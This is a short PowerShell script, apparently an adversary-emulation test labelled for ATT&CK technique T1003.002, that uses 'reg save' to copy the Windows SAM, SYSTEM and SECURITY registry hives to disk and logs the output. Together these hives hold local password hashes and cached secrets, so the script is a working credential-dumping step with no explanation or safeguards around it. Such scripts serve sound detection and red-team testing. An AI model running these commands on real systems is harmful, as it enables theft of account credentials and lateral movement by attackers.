'***********T1003_002_1---Security-Account-Manager---Registry-dump-of-SAM-creds-secrets**********'| Out-File -FilePath $args[0]
cmd.exe /c 'reg save HKLM\sam sam' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'reg save HKLM\system system' |  Out-File -FilePath $args[0] -Append
cmd.exe /c 'reg save HKLM\security security' |  Out-File -FilePath $args[0] -Append
